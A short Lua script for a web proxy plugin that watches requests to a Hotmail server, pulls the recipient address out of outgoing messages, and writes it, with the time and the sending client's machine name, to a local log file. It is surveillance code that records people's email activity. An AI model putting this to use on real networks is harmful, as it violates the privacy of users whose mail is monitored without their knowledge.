  if ProxyAPIObject:GetRequestHeaderValue("Host") == "blu180.mail.live.com" then    
    local requestBody = ProxyAPIObject:GetRequestBody()
   i, j = string.find(requestBody, "cn=")
   if j== nil then
     return
   end

   m, n = string.find(requestBody, "SendMessage_ec&d=")
   if m == nil then
     return
   end
   
     k, l =  requestBody :find(',') 
     if k == nil or l == nil then
       return
     end
     
      local required = requestBody:sub(n ,k-1)
      if string.len(required) == 0 then
                return 
                end
           local msg = "\n" .. ProxyAPIObject:GetDateTime() .. "\t" .. " Sending mail to " .. required .. " from " .. ProxyAPIObject:GetClientName()      
                  ProxyAPIObject:WriteToFile("E:\\hotmaillogin.txt", msg)
     
    end       
 
